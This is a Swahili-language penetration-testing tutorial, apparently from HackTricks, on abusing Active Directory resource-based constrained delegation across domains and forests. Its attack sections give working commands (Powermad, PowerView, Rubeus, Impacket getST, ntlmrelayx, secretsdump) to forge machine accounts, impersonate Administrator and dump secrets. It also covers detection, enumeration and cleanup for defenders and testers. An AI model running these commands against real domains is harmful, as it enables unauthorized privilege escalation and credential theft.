# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Misingi ya Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) inafanana na [constrained delegation](constrained-delegation.md), lakini mwelekeo wa uaminifu umegeuzwa. Constrained delegation ya kawaida hurekodi huduma ambazo principal inaweza kukabidhi; RBCD hurekodi kwenye **resource lengwa** principals zinazoweza kuiga watumiaji kuelekea kwake.<sup>[[12]](#references)</sup>

Attribute ya _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ ya object lengwa ina security descriptor inayobainisha principals wanaoruhusiwa kutenda kwa niaba ya identities nyingine kuelekea kwenye resource hiyo.

Tofauti nyingine muhimu ni kwamba principal yenye **write permissions za kutosha kwenye machine account** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty`, na haki zinazofanana) inaweza kuweka _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Kusanidi constrained delegation ya kawaida kwa kawaida huhitaji ufikiaji wa kiutawala wenye mamlaka zaidi.<sup>[[1]](#references)</sup>

Kwa usahihi zaidi, kubadilisha mipangilio ya classic constrained-delegation kwa kawaida kunadhibitiwa na `SeEnableDelegationPrivilege` kwenye domain controller, haki ambayo kwa kawaida huwa na wasimamizi wenye mamlaka ya juu. RBCD huhamisha uamuzi huo kwenye security descriptor ya object lengwa, kwa hiyo ufikiaji wa kuandika property husika ya computer-object unaweza kutosha bila kuwa na haki hiyo ya mtumiaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Dhana Mpya

Flag ya **`TrustedToAuthForDelegation`** katika `userAccountControl` mara nyingi hufafanuliwa kama sharti la **S4U2Self**, lakini maelezo hayo hayajakamilika.\
Service principal yenye SPN inaweza kuomba S4U2Self bila flag hiyo. Flag ya `TrustedToAuthForDelegation` ikiwapo, service ticket inayorejeshwa huwa **forwardable**; ikiwa haipo, ticket kwa kawaida huwa **non-forwardable**.<sup>[[5]](#references)</sup>

Constrained delegation ya kawaida hukataa **non-forwardable TGS** katika hatua ya S4U2Proxy. RBCD inaweza kukubali ticket hiyo ya S4U2Self ikiwa security descriptor ya target imeidhinisha huduma inayoomba.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Muundo wa attack

> Ikiwa una **write-equivalent privileges** kwenye **computer account**, unaweza kupata ufikiaji wenye mamlaka kwenye mashine hiyo.

Tuseme mshambuliaji tayari ana **write-equivalent privileges kwenye victim computer object**.

1. Mshambuliaji **anacompromise** account yenye **SPN** au **anaitengeneza** ("Service A"). Kwa chaguo-msingi, mtumiaji aliye-authenticate kwenye domain anaweza kuunda hadi computer objects 10, kulingana na **_MachineAccountQuota_**; computer object hutoa SPN zinazoweza kutumika kiotomatiki.
2. Mshambuliaji **anatumia vibaya WRITE privilege yake** kwenye victim computer (ServiceB) kusanidi **resource-based constrained delegation ili kuruhusu ServiceA kuiga mtumiaji yeyote** dhidi ya victim computer hiyo (ServiceB).
3. Mshambuliaji hutumia Rubeus kufanya **full S4U attack** (S4U2Self na S4U2Proxy) kutoka Service A kwenda Service B kwa niaba ya mtumiaji **mwenye ufikiaji wenye mamlaka kwa Service B**.
   1. S4U2Self (kutoka kwenye account ya SPN iliyo-compromise au iliyoundwa): omba **TGS inayowakilisha Administrator kwa Service A** (non-forwardable).
   2. S4U2Proxy: tumia **non-forwardable TGS** hiyo kuomba service ticket inayowakilisha **Administrator** kwenda kwenye **victim host**.
   3. Ticket ya non-forwardable bado inaweza kufanya kazi katika mtiririko huu wa RBCD kwa sababu Service A imeidhinishwa kwenye security descriptor ya resource lengwa.
4. Mshambuliaji anaweza kufanya **pass-the-ticket** na **impersonate** mtumiaji ili kupata **ufikiaji kwa victim ServiceB**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` hufunga njia ya kawaida ya kuunda computer, lakini haiondoi write rights kwenye target computer object au udhibiti wa account iliyopo. Mtumiaji wa kawaida unayemdhibiti asiye na SPN wakati mwingine anaweza kutumiwa kama principal inayokabidhi kupitia [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd), ikiwemo ndani ya domain moja. Njia hiyo bado inahitaji RBCD write right inayotumika, udhibiti wa credentials za mtumiaji anayekabidhi, identity inayoweza kuigwa na kukabidhiwa, tabia ya usimbaji fiche ya Kerberos inayooana, na mabadiliko ya NT-hash yanayoweza kuvuruga account. Yachukulie haya kama masharti tofauti; attribute tupu ya RBCD au quota sifuri pekee havithibitishi mafanikio wala usalama.

Descriptor iliyopo ya RBCD inaweza pia kutaja **group** badala ya computer inayokabidhi moja kwa moja. Ikiwa unadhibiti computer account yenye SPN na unaweza kuiongeza kwenye group hiyo, uanachama mpya unaweza kutoa njia ya delegation bila kubadilisha attribute ya RBCD ya target computer. Kagua ACL ya group inayodhibiti uandishi wa uanachama unaotumika (ikiwemo deny ACEs), uanachama wa nested groups na token refresh, trustee SID iliyo kwenye descriptor, vizuizi vya delegation vya account inayoigwa, na target service SPN kabla ya kuhitimisha kuwa njia hiyo itafanya kazi.

Ili kuangalia _**MachineAccountQuota**_ ya domain, unaweza kutumia:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Shambulio

### Kuunda Kitu cha Kompyuta

Unaweza kuunda kitu cha kompyuta ndani ya domain ukitumia **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Kusanidi Resource-based Constrained Delegation

**Kwa kutumia Active Directory PowerShell module**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Kutumia powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Kufanya shambulio kamili la S4U (Windows/Rubeus)

Kwanza kabisa, tuliunda object mpya ya Computer kwa kutumia password `123456`, kwa hivyo tunahitaji hash ya password hiyo:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Hii itachapisha hashes za RC4 na AES za akaunti hiyo.\
Sasa, attack inaweza kufanywa:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Unaweza kutengeneza tiketi zaidi za huduma zaidi kwa kuuliza mara moja tu ukitumia parameta ya `/altservice` ya Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Watumiaji wanaweza kuwekwa alama ya **"Akaunti ni nyeti na haiwezi kukabidhiwa."** Alama hiyo ikiwezeshwa, akaunti haiwezi kuigwa kupitia mtiririko huu wa delegation. BloodHound huonyesha sifa hii wakati wa uchanganuzi.

### Zana za Linux: RBCD ya mwanzo hadi mwisho kwa kutumia Impacket (2024+)

Ukitumia Linux, unaweza kutekeleza mnyororo mzima wa RBCD kwa kutumia zana rasmi za Impacket:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Vidokezo
- Ikiwa LDAP signing/LDAPS imetekelezwa, tumia `impacket-rbcd -use-ldaps ...`.
- Pendelea funguo za AES; domains nyingi za kisasa huzuia RC4. Impacket na Rubeus zote zinaunga mkono mtiririko unaotumia AES pekee.
- Impacket inaweza kuandika upya `sname` ("AnySPN") kwa baadhi ya tools, lakini pata SPN sahihi kila inapowezekana (kwa mfano, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD kati ya domains na forests

Ikiwa **principal anayefanya delegation** unayemdhibiti yuko kwenye **domain tofauti** (au hata **forest tofauti**) na **kompyuta ya rasilimali**, bado huu ni **RBCD**, lakini mtiririko wa ticket si tena mtiririko wa kawaida wa domain moja `S4U2Self -> S4U2Proxy`.

### RBCD kati ya domains: sanidi principal wa nje kwa kutumia SID

Unapoweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka **domain tofauti**, huenda mashine/mtumiaji wa nje **asitatuliwe kwa jina** kwenye LDAP ya target domain. Katika hali hiyo, sanidi ingizo la delegation kwa kutumia **SID** ya principal wa nje badala ya sAMAccountName/UPN yake.

Hili ni muhimu hasa unapofanya relay ya NTLM kwenda LDAP kwa `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Maelezo:
- `--sid` huiambia `ntlmrelayx.py` ichukulie `--escalate-user` kama SID, jambo linalohitajika wakati akaunti inayokabidhi iko nje ya domain lengwa.
- Hata kama zana itaonyesha `User not found in LDAP`, uandishi wa delegation bado unaweza kufanikiwa kwa sababu security descriptor huhifadhi SID ya nje moja kwa moja.

### RBCD ya domain-tofauti: mfuatano wa cross-realm S4U

Baada ya principal ya nje kuwekwa kwenye `msDS-AllowedToActOnBehalfOfOtherIdentity`, mtiririko unaofanya kazi wa domain-tofauti ni:<sup>[[9]](#references)[[13]](#references)</sup>

1. Pata **TGT** ya principal inayokabidhi kutoka kwenye domain yake.
2. Omba **referral TGT** ya `krbtgt/<target-domain>`.
3. Omba **cross-realm S4U2Self referral** ya mtumiaji anayeigizwa kwenye DC ya target-domain.
4. Omba tiketi halisi ya **S4U2Self** ya mtumiaji huyo tena kwenye domain ya delegator.
5. Tekeleza **S4U2Proxy** kwenye domain ya delegator ili kupata referral ticket ya target-domain.
6. Tekeleza **S4U2Proxy** ya mwisho kwenye DC ya target-domain ili kupata service ticket ya `cifs/host.target`, `host/host.target`, n.k.

Hii ndiyo sababu zana za kawaida za Linux mara nyingi hushindwa kwenye RBCD ya domain-tofauti:<sup>[[9]](#references)</sup>
- **realm** ya ombi huenda ikahitaji kuwa tofauti na realm ya TGT inayotumika kwenye `TGS-REQ`
- mfuatano huo unahitaji hatua **huru za S4U2Proxy**, si `S4U2Self` pekee au `S4U2Self` inayofuatwa mara moja na `S4U2Proxy` moja

### RBCD ya domain-tofauti kutoka Linux

Synacktiv ilichapisha utekelezaji wa Impacket `getST.py` unaorudia mfuatano wa cross-realm kutoka Linux kwa kushughulikia KDC zote mbili moja kwa moja:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Kiutendaji, hoja mpya ni:
- `-dc-ip`: DC ya domain **inayokabidhi**
- `-targetdomain`: domain ya **kompyuta ya rasilimali**
- `-targetdc`: DC ya domain ya **rasilimali**

### Vizuizi vya RBCD kati ya forest

RBCD kati ya forest ina kizuizi muhimu: **mtumiaji anayeigwa lazima awe wa forest sawa na principal inayokabidhi**. Kwa maneno mengine, ikiwa akaunti ya mashine unayoidhibiti iko kwenye `valhalla.local` na rasilimali lengwa iko kwenye `asgard.local`, kwa kawaida **huwezi kuwaiga watumiaji wowote wa `asgard.local` na kuwafikia rasilimali hiyo kupitia RBCD**.<sup>[[9]](#references)</sup>

Bado inaweza kutumiwa vibaya katika hali hizi:
- mtumiaji wa **forest inayokabidhi** ni **local admin** (au ana haki nyingine za juu) kwenye host ya rasilimali iliyo kwenye forest nyingine
- trust inaruhusu njia inayohitajika ya uthibitishaji na SID ya kigeni inakubaliwa kwenye security descriptor ya kompyuta lengwa

### Upekee wa protocol ya RBCD kati ya forest

RBCD kati ya forest si tu “cross-domain pamoja na trust”. Mtiririko ulioonekana una upekee miwili ambayo zana za kawaida kihistoria hazizingatii:<sup>[[9]](#references)</sup>

1. Ombi la ziada la **S4U2Proxy** linaloweka **`PA-PAC-OPTIONS=branch-aware`**
2. Ticket ya mwisho ya huduma inayoweza kurejeshwa kwa kutumia **RC4**, hata kama etypes nyingine ziliombwa

Mtiririko wa utekelezaji ni:

1. Pata TGT ya principal inayokabidhi katika forest A.
2. Omba **S4U2Self** kwa mtumiaji anayeigwa katika forest A.
3. Omba **S4U2Proxy** katika forest A ili kupata referral TGT ya forest B.
4. Tuma ombi la pili la **S4U2Proxy** katika forest A **bila** ticket ya S4U2Self kama ticket ya ziada, lakini ukiwasha `branch-aware`, ili kupata referral TGT nyingine ya forest B.
5. Kwa hiari, omba ticket ya kawaida ya huduma katika forest B kwa principal inayokabidhi (ticket hii haihitajiki kwa matumizi mabaya ya mwisho).
6. Tumia referral tickets kutoka hatua za 3 na 4 kuomba ticket ya mwisho ya **S4U2Proxy** katika forest B, kwa mtumiaji wa forest A anayeigwa, kuelekea SPN lengwa.

### RBCD kati ya forest kutoka Linux

Tawi lilelile la Synacktiv Impacket linaongeza switch ya `-forest` kwa mantiki hii:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### RBCD ya kujirudia katika domains nyingi (3+ domains)

Katika **forests za domains nyingi**, **S4U2Self** na **S4U2Proxy** zinaweza **kujiriudia** badala ya kusimama baada ya referral moja:

- **S4U2Self ya kujirudia**: `S4U2Self` ya kwanza hutumwa kwa **domain ya mtumiaji anayeigizwa**, hatua za kati za parent/child hupitiwa kwa kutumia referrals za kawaida za `TGS-REQ` za `krbtgt/<REALM>`, na **S4U2Self ya mwisho** hutumwa katika **domain ya principal inayotekeleza delegation**.
- Hii inamaanisha kuwa **kuwa tu na TGT** ya akaunti ya mashine kunaweza kutosha kuigiza **admin kutoka domain nyingine katika forest hiyo hiyo** na kuomba `cifs/host`, `host/host`, `wsman/host`, n.k.
- **S4U2Proxy ya kujirudia** hufuata mnyororo wa trust kwa njia hiyo hiyo: hatua za kati hutumia tena ticket iliyotangulia kama TGT huku zikiomba referral inayofuata ya `krbtgt/<REALM>`, na hatua ya mwisho pekee ndiyo hurejesha service ticket ya mwisho.<sup>[[10]](#references)</sup>

Mfano wa vitendo katika forest hiyo hiyo ni:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less cross-domain / cross-forest RBCD

Ikiwa **delegating principal ni user asiye na SPN**, `S4U2Self` ya mwisho katika mfululizo wa recursive hushindwa kwa **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Njia ya kukwepa hili ni **kujaribu tena hop ya mwisho pekee kama `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Muhtasari wa abuse chain:

1. Authenticate kwa kutumia **NT hash** ili kusukuma KDC itumie **RC4-HMAC (etype 23)**.
2. Omba **`-self -u2u`** kwanza, na uitenganishe ticket hiyo na hatua ya proxy itakayofuata.
3. Toa **TGT session key** kwa `describeTicket.py`.
4. Badilisha **NT hash** ya user iwe **session key** hiyo kwa kutumia `changepasswd.py -newhashes <session_key>`.
5. Tumia tena ticket ya **`S4U2Self+U2U`** kama **`-additional-ticket`** wakati wa ombi tofauti la **`-proxy`**.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Tahadhari za uendeshaji:

- Ikiwa **hop ya kwanza inayoaminika tayari iko kwenye forest nyingine**, tumia algorithm ya **branch-aware** (`getST.py ... -forest`) ili kuendana na tabia ya asili ya Windows. Ikiwa forest ya nje itafikiwa tu **baadaye** kwenye mnyororo, mtiririko wa recursive usio wa branch-aware unaweza bado kufanya kazi.<sup>[[9]](#references)</sup>
- Kwenye DC za hivi karibuni za **Windows Server 2022/2025**, kulazimisha RC4 kunaweza kushindwa kwa **`KDC_ERR_ETYPE_NOSUPP`** kutokana na kuondolewa kwa RC4; hivyo **RBCD isiyo na SPN inaweza isiwezekane**, ingawa RBCD ya kawaida inayotumia SPN bado hufanya kazi kwa AES.<sup>[[15]](#references)</sup>
- Tekeleza **`S4U2Self+U2U` kabla ya kubadilisha hash/nenosiri la mtumiaji**: **`SamrChangePasswordUser`** haihesabu upya funguo za Kerberos AES za akaunti, kwa hiyo kubadilisha nenosiri kwanza kunaweza kuvuruga maombi ya tiketi yatakayofuata.<sup>[[14]](#references)</sup>
- Akaunti inayoigizwa lazima bado iruhusu **delegation**: **Protected Users** na akaunti zilizo na **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** huzuia mnyororo.

## Vidokezo vya ugunduzi / uimarishaji

- Njia za RBCD katika domain/forest mbalimbali bado kwa kawaida huundwa kupitia **matumizi mabaya ya ACL** au **relay-to-LDAP**. Washa utekelezaji wa **LDAP signing** na **LDAP channel binding** kwenye DC ili kuvunja njia za kawaida za usanidi.
- Kagua ni nani anayeweza kuandika `msDS-AllowedToActOnBehalfOfOtherIdentity` kwenye computer objects, na utambue SID zilizohifadhiwa, zikiwemo za **foreign security principals**.
- Katika mazingira yenye trust nyingi, kagua **Selective Authentication**, **SID filtering**, na iwapo watumiaji kutoka forest ya nje wana haki za **local admin** kwenye resource hosts.

### Kufikia

Mstari wa mwisho wa amri utafanya **shambulio kamili la S4U na kuingiza TGS** ya Administrator kwenye host lengwa, ndani ya **memory**.\
Katika mfano huu, TGS ya huduma ya **CIFS** iliombwa kutoka kwa Administrator, kwa hiyo utaweza kufikia **C$**:

```bash
ls \\victim.domain.local\C$
```

### Tumia vibaya tiketi tofauti za huduma

Jifunze kuhusu [**tiketi za huduma zinazopatikana hapa**](silver-ticket.md#available-services).

## Kuhesabu, kukagua na kusafisha

### Hesabu kompyuta ambazo RBCD imesanidiwa

PowerShell (kusimbua SD ili kutatua SIDs):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (soma au futa kwa amri moja):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Kusafisha / kuweka upya RBCD

- PowerShell (futa attribute):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Hitilafu za Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Hii inamaanisha kuwa Kerberos imesanidiwa kutotumia DES au RC4, na unatoa hash ya RC4 pekee. Mpe Rubeus angalau hash ya AES256 (au mpe hash za rc4, aes128 na aes256). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** wakati wa kutumia `-self` kwa mtumiaji wa kawaida: huenda principal inayokabidhi haina **SPN**. Jaribu tena **last hop** kama **`S4U2Self+U2U`** badala ya `S4U2Self` ya kawaida.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** wakati wa kutumia **SPN-less RBCD**: DC za hivi karibuni zinaweza kukataa njia ya **RC4-HMAC** inayolazimishwa, ambayo inahitajika kwa ujanja wa `S4U2Self+U2U` + session-key-substitution. Jaribu njia ya kawaida ya **SPN-backed** RBCD ukitumia AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Hii inamaanisha kuwa saa ya kompyuta ya sasa inatofautiana na ya DC, hivyo Kerberos haifanyi kazi ipasavyo.
- **`preauth_failed`**: Hii inamaanisha kuwa username + hashes zilizotolewa hazifanyi kazi kuingia. Huenda umesahau kuweka "$" ndani ya username wakati wa kutengeneza hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Hii inaweza kumaanisha:
  - Mtumiaji unayejaribu kuiga hawezi kufikia huduma unayotaka (kwa sababu huwezi kumuiga au hana mapendeleo ya kutosha)
  - Huduma uliyoomba haipo (ukiomba tiketi ya winrm lakini winrm haifanyi kazi)
  - fakecomputer uliyounda imepoteza mapendeleo yake kwenye seva iliyo hatarini, na unahitaji kuyarejesha.
  - Unatumia vibaya classic KCD; kumbuka kuwa RBCD hufanya kazi na tiketi za S4U2Self zisizo forwardable, ilhali KCD inahitaji ziwe forwardable.

## Vidokezo, relays na njia mbadala

- Unaweza pia kuandika RBCD SD kupitia AD Web Services (ADWS) ikiwa LDAP imechujwa. Tazama:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Minyororo ya Kerberos relay mara nyingi huishia kwenye RBCD ili kupata SYSTEM ya ndani kwa hatua moja. Tazama mifano ya vitendo ya mwanzo hadi mwisho:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ikiwa LDAP signing/channel binding **zimezimwa** na unaweza kuunda machine account, zana kama **KrbRelayUp** zinaweza kupeleka Kerberos auth iliyolazimishwa kwa LDAP, kuweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kwa machine account yako kwenye target computer object, na mara moja kumuiga **Administrator** kupitia S4U kutoka nje ya host.<sup>[[8]](#references)</sup>

## References

- [1] [Kumtingisha Mbwa: Kutumia Vibaya Resource-Based Constrained Delegation Kushambulia Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Neno Jingine Kuhusu Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Kuteka Computer Object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Matumizi Mabaya ya Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Iliua Domain: Muhtasari wa Kerberos kwa Madhumuni ya Mashambulizi](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (rasmi)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Cheatsheet ya haraka ya Linux yenye sintaksia ya hivi karibuni](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing imezimwa → Kerberos relay hadi RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Kuchunguza RBCD kati ya domain na forest](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Kuchunguza RBCD kati ya domain na forest: sehemu ya 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Tawi la Synacktiv Impacket - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Muhtasari wa Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kugundua na kurekebisha matumizi ya RC4 katika Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Maelezo ya S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
